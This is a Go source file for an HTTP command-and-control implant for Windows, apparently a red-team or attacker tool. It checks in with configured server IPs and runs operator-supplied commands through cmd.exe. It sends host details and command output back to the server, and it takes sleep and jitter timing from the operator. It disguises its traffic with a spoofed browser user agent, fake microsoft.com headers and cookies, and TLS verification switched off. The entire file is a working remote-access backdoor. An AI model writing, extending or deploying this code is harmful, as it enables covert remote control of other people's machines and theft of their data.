package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

var (
	ip               []string = []string{"172.31.24.20,172.31.24.30"} // put the ip(s) of your server(s).
	ipIndex          int      = 1
	url              string   = ""
	checkin_endpoint string   = "/checkin" //added (s)
	c2_endpoint      string   = "/cmdctrl" //added (s)
	sleep_endpoint   string   = "/sleepctrl"
	//user_agent       string = "ironcat-http-c2"
	user_agent string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
	// Operator-controlled timing values pulled from /sleepctrl in mode 3.
	pollSleepSeconds     int = 10
	pollJitterMaxSeconds int = 0
	rng                      = rand.New(rand.NewSource(time.Now().UnixNano()))

	conf = &tls.Config{
		InsecureSkipVerify: true,
		//MinVersion:         tls.VersionTLS10,
		//MaxVersion: tls.VersionTLS11,
	}

	tr = &http.Transport{
		MaxIdleConns:       10,
		IdleConnTimeout:    30 * time.Second,
		DisableCompression: true,
		TLSClientConfig:    conf,
	}

	client = &http.Client{
		CheckRedirect: http.DefaultClient.CheckRedirect,
		Transport:     tr,
		Timeout:       20 * time.Second,
	}
)

const (
	requestTimeout = 15 * time.Second
	commandTimeout = 30 * time.Second
	minSleepSecs   = 1
	maxSleepSecs   = 3600
	minJitterSecs  = 0
	maxJitterSecs  = 3600
)

func newRequest(method, endpoint string, body io.Reader) (*http.Request, context.CancelFunc, error) {
	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
	req, err := http.NewRequestWithContext(ctx, method, endpoint, body)
	if err != nil {
		cancel()
		return nil, nil, err
	}
	return req, cancel, nil
}

func currentEndpoint(path string) string {
	if len(ip) == 0 {
		return ""
	}
	return "https://" + ip[ipIndex] + path
}

func rotateIP() {
	if len(ip) <= 1 {
		return
	}
	ipIndex = (ipIndex + 1) % len(ip)
}

func doRequestWithFailover(req *http.Request) (*http.Response, error) {
	if len(ip) == 0 {
		return nil, fmt.Errorf("no C2 IPs configured")
	}

	attempts := len(ip)
	var lastErr error

	for i := 0; i < attempts; i++ {
		attemptReq := req.Clone(req.Context())
		attemptReq.URL.Scheme = "https"
		attemptReq.URL.Host = ip[ipIndex]

		if req.GetBody != nil {
			body, err := req.GetBody()
			if err != nil {
				return nil, err
			}
			attemptReq.Body = body
		}

		resp, err := client.Do(attemptReq)
		if err == nil {
			return resp, nil
		}

		lastErr = err
		fmt.Printf("request failed for %s: %v\n", ip[ipIndex], err)
		rotateIP()
	}

	return nil, lastErr
}

// function for http client checkin, waiting to see if there is a  to checking with server
func checkin() string {

	req, cancel, err := newRequest("GET", currentEndpoint(checkin_endpoint), nil)
	if err != nil {
		fmt.Println("checkin request creation failed:", err)
		return "0"
	}
	defer cancel()

	//Change your user agent for petes sake!
	req.Header.Set("User-Agent", user_agent)
	//req.Header.Set("User-Agent", rua())
	//Fake common header information.
	req.Header.Add("authority", "www.microsoft.com")
	req.Header.Add("path", "en-us")
	req.Header.Add("scheme", "https")
	req.Header.Add("Cookie", "cookie: _mkto_trk=id:157-GQE-382&token:_mch-microsoft.com-1599022070406-73765; MUID=0C6C942D240069701B7B9B15256F686C; _ga=GA1.2.1563654985.1599023783; WRUIDCD29072020=2975053460292425; optimizelyEndUserId=oeu1601924172691r0.6704369797938583; visid_incap_1204013=ki4LJkmJQrS6NZhKykfVoe+rpV8AAAAAQUIPAAAAAAAV88PbuOgQJcUJge2nL5Nz; IR_PI=5e7c0d30-34f2-11eb-bc8d-123ef70df310%7C1607636344965; msd365mkttr=Ai92Zvwbv1kvkvKQ3AsJ4cn8e4_UZIvic5TKghc9; WRUID=3011088853451815; _CT_RS_=Recording; MicrosoftApplicationsTelemetryDeviceId=3374474d-5650-4319-bb15-7af7010e9ed6; __CT_Data=gpv=4&ckp=tld&dm=microsoft.com&apv_1067_www32=4&cpv_1067_www32=4&rpv_1067_www32=4&rpv_1001_www32=1; ai_user=AevEe|2021-08-29T12:51:44.644Z; MC1=GUID=b98a52c3eef74ef0a7c3b3508a9be2f6&HASH=b98a&LV=202109&V=4&LU=1630636208608; MSFPC=GUID=b98a52c3eef74ef0a7c3b3508a9be2f6&HASH=b98a&LV=202109&V=4&LU=1630636208608; display-culture=en-US; _cs_c=0; _abck=F0B689AF1940263B17FB7E39382DB648~-1~YAAQlzhjaG/mkiV9AQAAQ2gXSwY/AYphQLVLWqLmyO7+gFJSp+mHxrLbvyupyOVpHLKzWuGRT1LYLi1Oan+3JfXOD/IAoyddINIdzDk3KlTDLgNJ6jO+j+gjjYdtQr7hTvX+2W+82xrEkl4NIQAXJzbQz+5k4CiGQPWPMoUATMpNPHoRFquXbn9rt/2mfa713E3YnTgYXyKPu/mMSJ7sSo5O30fn7a5iGv+Y2Su/IMI1sUPpGXRJ02B8hDjQrUozNP7VDO33gDiBwewsb487Az0BWsZtLrzbZFBimWU8xA0R1y34VgnlkCwSpcGx//f77eDG39J2JHmdjcEzfpdGjpT7JGJ8NBzV1Yf7NHr7ZhFc5sGR~-1~-1~-1;")

	resp, err := doRequestWithFailover(req)
	if err != nil {
		fmt.Println("checkin request failed:", err)
		return "0"
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		fmt.Println("checkin unexpected status:", resp.Status)
		return "0"
	}

	mode := resp.Header.Get("Mode")
	if mode == "" {
		fmt.Println("checkin missing Mode header; defaulting to 0")
		return "0"
	}

	fmt.Println(mode)
	return mode

}

// enumerate OS without using CMD.exe and return values acorss http c2
func os_enum() {

	hostname, err := os.Hostname()
	if err != nil {
		fmt.Println("hostname lookup failed:", err)
		hostname = "unknown"
	}

	var envvars []string
	envvars = os.Environ()

	envvar := "N/A"
	if len(envvars) > 0 {
		envvar = envvars[0]
	}

	executable, err := os.Executable()
	if err != nil {
		fmt.Println("executable lookup failed:", err)
		executable = "unknown"
	}

	pid := strconv.Itoa(os.Getpid())
	ppid := strconv.Itoa(os.Getppid())

	output := "Hostname: " + hostname + "\n" + "envars: " + envvar + "\n" + "executable: " + executable + "\n" + "PPID: " + ppid + "\n" + "PID: " + pid + "\n"

	//create response with outut to different API endpoint
	resc, cancel, err := newRequest("POST", currentEndpoint(c2_endpoint), bytes.NewBuffer([]byte(output)))
	if err != nil {
		fmt.Println("os_enum request creation failed:", err)
		return
	}
	defer cancel()

	//Enable to change user agent to specified value.
	resc.Header.Set("User-Agent", user_agent)
	resc.Header.Set("Host", "Something In Your Org")
	resc.Header.Add("Content-Type", "application/text")
	resc.Header.Add("authority", "www.microsoft.com")
	resc.Header.Add("path", "en-us")
	resc.Header.Add("scheme", "https")
	resc.Header.Add("Cookie", "cookie: _mkto_trk=id:157-GQE-382&token:_mch-microsoft.com-1599022070406-73765; MUID=0C6C942D240069701B7B9B15256F686C; _ga=GA1.2.1563654985.1599023783; WRUIDCD29072020=2975053460292425; optimizelyEndUserId=oeu1601924172691r0.6704369797938583; visid_incap_1204013=ki4LJkmJQrS6NZhKykfVoe+rpV8AAAAAQUIPAAAAAAAV88PbuOgQJcUJge2nL5Nz; IR_PI=5e7c0d30-34f2-11eb-bc8d-123ef70df310%7C1607636344965; msd365mkttr=Ai92Zvwbv1kvkvKQ3AsJ4cn8e4_UZIvic5TKghc9; WRUID=3011088853451815; _CT_RS_=Recording; MicrosoftApplicationsTelemetryDeviceId=3374474d-5650-4319-bb15-7af7010e9ed6; __CT_Data=gpv=4&ckp=tld&dm=microsoft.com&apv_1067_www32=4&cpv_1067_www32=4&rpv_1067_www32=4&rpv_1001_www32=1; ai_user=AevEe|2021-08-29T12:51:44.644Z; MC1=GUID=b98a52c3eef74ef0a7c3b3508a9be2f6&HASH=b98a&LV=202109&V=4&LU=1630636208608; MSFPC=GUID=b98a52c3eef74ef0a7c3b3508a9be2f6&HASH=b98a&LV=202109&V=4&LU=1630636208608; display-culture=en-US; _cs_c=0; _abck=F0B689AF1940263B17FB7E39382DB648~-1~YAAQlzhjaG/mkiV9AQAAQ2gXSwY/AYphQLVLWqLmyO7+gFJSp+mHxrLbvyupyOVpHLKzWuGRT1LYLi1Oan+3JfXOD/IAoyddINIdzDk3KlTDLgNJ6jO+j+gjjYdtQr7hTvX+2W+82xrEkl4NIQAXJzbQz+5k4CiGQPWPMoUATMpNPHoRFquXbn9rt/2mfa713E3YnTgYXyKPu/mMSJ7sSo5O30fn7a5iGv+Y2Su/IMI1sUPpGXRJ02B8hDjQrUozNP7VDO33gDiBwewsb487Az0BWsZtLrzbZFBimWU8xA0R1y34VgnlkCwSpcGx//f77eDG39J2JHmdjcEzfpdGjpT7JGJ8NBzV1Yf7NHr7ZhFc5sGR~-1~-1~-1;")

	rescn, err := doRequestWithFailover(resc)
	if err != nil {
		fmt.Println("os_enum post failed:", err)
		return
	}
	defer rescn.Body.Close()

	if rescn.StatusCode < http.StatusOK || rescn.StatusCode >= http.StatusMultipleChoices {
		fmt.Println("os_enum unexpected status:", rescn.Status)
		return
	}

	fmt.Printf(rescn.Status)

}

func c2() {
	//for transport layer creat transport for client to use.
	req, cancel, err := newRequest("GET", currentEndpoint(c2_endpoint), nil)
	if err != nil {
		fmt.Println("command request creation failed:", err)
		return
	}
	defer cancel()

	//Fake common header information.
	req.Header.Set("User-Agent", user_agent)
	req.Header.Set("Host", "Something In Your Org")
	req.Header.Add("Content-Type", "application/text")
	req.Header.Add("authority", "www.microsoft.com")
	req.Header.Add("path", "en-us")
	req.Header.Add("scheme", "https")
	req.Header.Add("Cookie", "cookie: _mkto_trk=id:157-GQE-382&token:_mch-microsoft.com-1599022070406-73765; MUID=0C6C942D240069701B7B9B15256F686C; _ga=GA1.2.1563654985.1599023783; WRUIDCD29072020=2975053460292425; optimizelyEndUserId=oeu1601924172691r0.6704369797938583; visid_incap_1204013=ki4LJkmJQrS6NZhKykfVoe+rpV8AAAAAQUIPAAAAAAAV88PbuOgQJcUJge2nL5Nz; IR_PI=5e7c0d30-34f2-11eb-bc8d-123ef70df310%7C1607636344965; msd365mkttr=Ai92Zvwbv1kvkvKQ3AsJ4cn8e4_UZIvic5TKghc9; WRUID=3011088853451815; _CT_RS_=Recording; MicrosoftApplicationsTelemetryDeviceId=3374474d-5650-4319-bb15-7af7010e9ed6; __CT_Data=gpv=4&ckp=tld&dm=microsoft.com&apv_1067_www32=4&cpv_1067_www32=4&rpv_1067_www32=4&rpv_1001_www32=1; ai_user=AevEe|2021-08-29T12:51:44.644Z; MC1=GUID=b98a52c3eef74ef0a7c3b3508a9be2f6&HASH=b98a&LV=202109&V=4&LU=1630636208608; MSFPC=GUID=b98a52c3eef74ef0a7c3b3508a9be2f6&HASH=b98a&LV=202109&V=4&LU=1630636208608; display-culture=en-US; _cs_c=0; _abck=F0B689AF1940263B17FB7E39382DB648~-1~YAAQlzhjaG/mkiV9AQAAQ2gXSwY/AYphQLVLWqLmyO7+gFJSp+mHxrLbvyupyOVpHLKzWuGRT1LYLi1Oan+3JfXOD/IAoyddINIdzDk3KlTDLgNJ6jO+j+gjjYdtQr7hTvX+2W+82xrEkl4NIQAXJzbQz+5k4CiGQPWPMoUATMpNPHoRFquXbn9rt/2mfa713E3YnTgYXyKPu/mMSJ7sSo5O30fn7a5iGv+Y2Su/IMI1sUPpGXRJ02B8hDjQrUozNP7VDO33gDiBwewsb487Az0BWsZtLrzbZFBimWU8xA0R1y34VgnlkCwSpcGx//f77eDG39J2JHmdjcEzfpdGjpT7JGJ8NBzV1Yf7NHr7ZhFc5sGR~-1~-1~-1;")
	respn, err := doRequestWithFailover(req)
	if err != nil {
		fmt.Println("command fetch failed:", err)
		return
	}
	defer respn.Body.Close()

	if respn.StatusCode == http.StatusNoContent {
		fmt.Println("no command available")
		return
	}
	if respn.StatusCode != http.StatusOK {
		fmt.Println("command fetch unexpected status:", respn.Status)
		return
	}

	msgn, err := io.ReadAll(respn.Body)
	if err != nil {
		fmt.Println("command response read failed:", err)
		return
	}

	if strings.TrimSpace(string(msgn)) == "" {
		fmt.Println("empty command payload")
		return
	}

	var c Cmd
	err = json.Unmarshal(msgn, &c)
	if err != nil {
		fmt.Println("invalid command payload:", err)
		return
	}

	command := strings.TrimSpace(c.Command)
	if command == "" {
		fmt.Println("empty command received, skipping execution")
		return
	}

	fmt.Println(command)
	cmdCtx, cmdCancel := context.WithTimeout(context.Background(), commandTimeout)
	defer cmdCancel()
	t := exec.CommandContext(cmdCtx, "cmd.exe", "/c", command)
	output, err := t.CombinedOutput()
	if cmdCtx.Err() == context.DeadlineExceeded {
		fmt.Println("command execution timed out")
	}

	if err != nil {
		fmt.Println("command execution error:", err)
		if len(output) == 0 {
			output = []byte(err.Error())
		}
	}

	fmt.Println(string(output))

	//create response with outut to different API endpoint
	resc, postCancel, err := newRequest("POST", currentEndpoint(c2_endpoint), bytes.NewBuffer(output))
	if err != nil {
		fmt.Println("command result request creation failed:", err)
		return
	}
	defer postCancel()

	//Enable to change user agent to specified value.
	resc.Header.Set("User-Agent", user_agent)
	resc.Header.Add("Content-Type", "application/text")
	resc.Header.Set("Host", "Something In Your Org")
	resc.Header.Add("Content-Type", "application/text")
	resc.Header.Add("authority", "www.microsoft.com")
	resc.Header.Add("path", "en-us")
	resc.Header.Add("scheme", "https")
	resc.Header.Add("Cookie", "cookie: _mkto_trk=id:157-GQE-382&token:_mch-microsoft.com-1599022070406-73765; MUID=0C6C942D240069701B7B9B15256F686C; _ga=GA1.2.1563654985.1599023783; WRUIDCD29072020=2975053460292425; optimizelyEndUserId=oeu1601924172691r0.6704369797938583; visid_incap_1204013=ki4LJkmJQrS6NZhKykfVoe+rpV8AAAAAQUIPAAAAAAAV88PbuOgQJcUJge2nL5Nz; IR_PI=5e7c0d30-34f2-11eb-bc8d-123ef70df310%7C1607636344965; msd365mkttr=Ai92Zvwbv1kvkvKQ3AsJ4cn8e4_UZIvic5TKghc9; WRUID=3011088853451815; _CT_RS_=Recording; MicrosoftApplicationsTelemetryDeviceId=3374474d-5650-4319-bb15-7af7010e9ed6; __CT_Data=gpv=4&ckp=tld&dm=microsoft.com&apv_1067_www32=4&cpv_1067_www32=4&rpv_1067_www32=4&rpv_1001_www32=1; ai_user=AevEe|2021-08-29T12:51:44.644Z; MC1=GUID=b98a52c3eef74ef0a7c3b3508a9be2f6&HASH=b98a&LV=202109&V=4&LU=1630636208608; MSFPC=GUID=b98a52c3eef74ef0a7c3b3508a9be2f6&HASH=b98a&LV=202109&V=4&LU=1630636208608; display-culture=en-US; _cs_c=0; _abck=F0B689AF1940263B17FB7E39382DB648~-1~YAAQlzhjaG/mkiV9AQAAQ2gXSwY/AYphQLVLWqLmyO7+gFJSp+mHxrLbvyupyOVpHLKzWuGRT1LYLi1Oan+3JfXOD/IAoyddINIdzDk3KlTDLgNJ6jO+j+gjjYdtQr7hTvX+2W+82xrEkl4NIQAXJzbQz+5k4CiGQPWPMoUATMpNPHoRFquXbn9rt/2mfa713E3YnTgYXyKPu/mMSJ7sSo5O30fn7a5iGv+Y2Su/IMI1sUPpGXRJ02B8hDjQrUozNP7VDO33gDiBwewsb487Az0BWsZtLrzbZFBimWU8xA0R1y34VgnlkCwSpcGx//f77eDG39J2JHmdjcEzfpdGjpT7JGJ8NBzV1Yf7NHr7ZhFc5sGR~-1~-1~-1;")

	rescn, err := doRequestWithFailover(resc)
	if err != nil {
		fmt.Println("command result post failed:", err)
		return
	}
	defer rescn.Body.Close()

	if rescn.StatusCode < http.StatusOK || rescn.StatusCode >= http.StatusMultipleChoices {
		fmt.Println("command result post unexpected status:", rescn.Status)
		return
	}

	fmt.Printf(rescn.Status)
}

func updateSleep() {
	req, cancel, err := newRequest("GET", currentEndpoint(sleep_endpoint), nil)
	if err != nil {
		fmt.Println("sleepctrl request creation failed:", err)
		return
	}
	defer cancel()

	req.Header.Set("User-Agent", user_agent)
	req.Header.Add("authority", "www.microsoft.com")
	req.Header.Add("path", "en-us")
	req.Header.Add("scheme", "https")

	resp, err := doRequestWithFailover(req)
	if err != nil {
		fmt.Println("sleepctrl request failed:", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		fmt.Println("sleepctrl unexpected status:", resp.Status)
		return
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("sleepctrl response read failed:", err)
		return
	}

	var cfg SleepCfg
	if err := json.Unmarshal(body, &cfg); err != nil {
		fmt.Println("invalid sleepctrl payload:", err)
		return
	}

	if cfg.SleepSeconds < minSleepSecs || cfg.SleepSeconds > maxSleepSecs {
		fmt.Printf("sleepctrl value out of range (%d-%d): %d\n", minSleepSecs, maxSleepSecs, cfg.SleepSeconds)
		return
	}
	if cfg.JitterSeconds < minJitterSecs || cfg.JitterSeconds > maxJitterSecs {
		fmt.Printf("sleepctrl jitter out of range (%d-%d): %d\n", minJitterSecs, maxJitterSecs, cfg.JitterSeconds)
		return
	}

	pollSleepSeconds = cfg.SleepSeconds
	pollJitterMaxSeconds = cfg.JitterSeconds
	fmt.Printf("updated poll timing: base=%ds jitter_max=%ds\n", pollSleepSeconds, pollJitterMaxSeconds)
}

// nextPollDelay adds a random jitter in the range [0, jitter_max] each loop.
func nextPollDelay() time.Duration {
	jitterAdd := 0
	if pollJitterMaxSeconds > 0 {
		jitterAdd = rng.Intn(pollJitterMaxSeconds + 1)
	}
	return time.Duration(pollSleepSeconds+jitterAdd) * time.Second
}

func check(e error) {
	if e != nil {
		fmt.Println(e)

	}
}

type Cmd struct {
	Command string `json:"cmd"`
}

type SleepCfg struct {
	SleepSeconds  int `json:"sleep_seconds"`
	JitterSeconds int `json:"jitter_seconds"`
}

func main() {
	for 1 == 1 {

		switch checkin() {

		case "0":
		case "1":
			os_enum()
		case "2":
			c2()
		case "3":
			updateSleep()
		default:
		}
		time.Sleep(nextPollDelay())

	}
}

/*
conf := &tls.Config{
		InsecureSkipVerify: true,
	}

	tr := &http.Transport{
		MaxIdleConns:       10,
		IdleConnTimeout:    30 * time.Second,
		DisableCompression: true,
		TLSClientConfig:    conf,
	}

	for 1 == 1 {
		client := &http.Client{Transport: tr}
		req, err := http.NewRequest("GET", "https://localhost/checkin", nil)
		req.Header.Set("User-Agent", "Ironcatc2")
		resp, err := client.Do(req)
		check(err)
		defer resp.Body.Close()

		//second get request
		req.Header.Add("Test", "oh my")
		req.Header.Set("User-Agent", "Ironcatc2")
		req.Header.Set("Host", "Not-Real")

		fmt.Printf("req.UserAgent(): %v\n", req.UserAgent())
		respn, err := client.Do(req)
		fmt.Println(respn.Body)
		check(err)
		msgn, err := io.ReadAll(respn.Body)
		check(err)
		cmd := string(msgn)
		fmt.Printf(cmd)
		var c Cmd
		err = json.Unmarshal(msgn, &c)
		fmt.Println(c.Command)

		t := exec.Command("cmd.exe", "/c", c.Command) //c.Command
		output, err := t.CombinedOutput()
		if err != nil {
			fmt.Println(err)
			continue
		}

		fmt.Println(string(output))

		//create response with outut to different API endpoint
		resc, err := http.NewRequest("POST", "https://localhost/cmdctrl", bytes.NewBuffer(output))
		check(err)
		resc.Header.Add("Test", "oh my")
		resc.Header.Set("User-Agent", "Ironcatc2")
		resc.Header.Set("Host", "Not-Real")
		resc.Header.Add("Content-Type", "application/text")
		rescn, err := client.Do(resc)
		fmt.Printf(rescn.Status)
		check(err)
		defer resc.Body.Close()
	}
*/
//os_enum()
/*
	test1 := http.Request{Method: "GET", RequestURI: "http://localhost/checkin"}

	r, err := http.NewRequest("GET", "http://localhost/checkin", io.MultiReader())
	if err != nil {
		fmt.Println(err)
	}

	rc, err := r.Client
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(rc.Header)
	fmt.Printf("r.UserAgent(): %v\n", r.UserAgent())
	t2, err2 := test1.Get("http://localhost/checkin")
	if err2 != nil {
		log.Default()
		fmt.Println(err)
	}
	fmt.Println(t2.Header)
*/
